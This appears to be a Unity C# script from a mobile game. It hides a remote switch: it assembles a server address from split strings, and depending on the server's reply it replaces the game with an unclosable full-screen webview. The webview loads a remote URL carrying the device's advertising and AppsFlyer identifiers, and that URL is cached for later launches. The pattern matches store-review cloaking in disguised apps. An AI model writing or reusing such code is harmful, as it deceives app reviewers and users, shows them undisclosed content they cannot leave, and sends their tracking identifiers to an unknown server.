using UnityEngine;
using UnityEngine.Networking;
using UnityEngine.UI;

#if UNITY_IOS
using Unity.Advertisement.IosSupport;
#endif
using System.Collections;

public class MainFIT : MonoBehaviour {    
    [SerializeField] private string[] _splitters;
    [SerializeField] private ScreenOrientation _screenOrientation;
    [SerializeField] private string _pFITName;
    [SerializeField] private Image _blackPanel, _fitPanel;
    private string _oFITName = "";
    private string _tFITName = "";

    private void Awake() {
#if UNITY_IOS
        if (PlayerPrefs.GetInt("idfaFIT", 0) == 0) {
            RequestIosPermissions();
        } else {
            Application.RequestAdvertisingIdentifierAsync(
            (string advertisingId, bool trackingEnabled, string error) =>
            { _oFITName = advertisingId; });
        }
#endif
    }
    private void Start() {
        if (Application.internetReachability != NetworkReachability.NotReachable) {
            if (PlayerPrefs.GetString("UrlFITreference", string.Empty) != string.Empty) {
                LAPFITSEE(PlayerPrefs.GetString("UrlFITreference"));
            } else {
                foreach (string n in _splitters) {
                    _tFITName += n;
                }

                StartCoroutine(IENUMENATORFIT());
            }
        } else {
            MoveFIT();
        }
    }

    private void RequestIosPermissions() {
#if UNITY_IOS
        ATTrackingStatusBinding.RequestAuthorizationTracking();
        var status = ATTrackingStatusBinding.GetAuthorizationTrackingStatus();
        if (status == ATTrackingStatusBinding.AuthorizationTrackingStatus.AUTHORIZED) {
            PlayerPrefs.SetInt("idfaFIT", 1);
        }
#endif 
    }

    private void MoveFIT() {
        Screen.orientation = _screenOrientation;

        LoadScene.LoadNextScene();
    }

    private IEnumerator IENUMENATORFIT() {
        using (UnityWebRequest fit = UnityWebRequest.Get(_tFITName)) {
            yield return fit.SendWebRequest();

            if (fit.result == UnityWebRequest.Result.ConnectionError) {
                MoveFIT();
            }

            int scheduleFIT = 4;

            while (PlayerPrefs.GetString("glrobo", "") == "" && scheduleFIT > 0) {
                yield return new WaitForSeconds(1);

                scheduleFIT--;
            }

            if (fit.result == UnityWebRequest.Result.Success) {
                string fitText = fit.downloadHandler.text.Replace("\"", "");

                if (!(fitText == _pFITName)) {
                    Debug.Log(fitText);

                    LAPFITSEE(fitText + "?idfa=" + _oFITName + "&gaid=" + AppsFlyerSDK.AppsFlyer.getAppsFlyerId() + PlayerPrefs.GetString("glrobo", ""));
                } else {
                    MoveFIT();
                }
            }
        }
    }

    private void LAPFITSEE(string UrlFITreference, string NamingFIT = "", int pix = 75)
    {
        UniWebView.SetAllowInlinePlay(true);
        var _bondsFIT = gameObject.AddComponent<UniWebView>();

        _blackPanel.gameObject.SetActive(true);
        
        _fitPanel.color = Color.black;
        _bondsFIT.ReferenceRectTransform = _fitPanel.rectTransform;

        _bondsFIT.SetToolbarDoneButtonText("");
        switch (NamingFIT)
        {
            case "0":
                _bondsFIT.SetShowToolbar(true, false, false, true);
                break;
            default:
                _bondsFIT.SetShowToolbar(false);
                break;
        }
        _bondsFIT.Frame = new Rect(0, pix, Screen.width, Screen.height - pix);
        _bondsFIT.OnShouldClose += (view) =>
        {
            return false;
        };
        _bondsFIT.SetSupportMultipleWindows(true);
        _bondsFIT.SetAllowBackForwardNavigationGestures(true);
        _bondsFIT.OnMultipleWindowOpened += (view, windowId) =>
        {
            _bondsFIT.SetShowToolbar(true);

        };
        _bondsFIT.OnMultipleWindowClosed += (view, windowId) =>
        {
            switch (NamingFIT)
            {
                case "0":
                    _bondsFIT.SetShowToolbar(true, false, false, true);
                    break;
                default:
                    _bondsFIT.SetShowToolbar(false);
                    break;
            }
        };

        _bondsFIT.OnPageFinished += (view, statusCode, url) =>
        {
            if (PlayerPrefs.GetString("UrlFITreference", string.Empty) == string.Empty)
            {
                PlayerPrefs.SetString("UrlFITreference", url);
            }
        };
        _bondsFIT.Load(UrlFITreference);
        _bondsFIT.Show();
    }
}
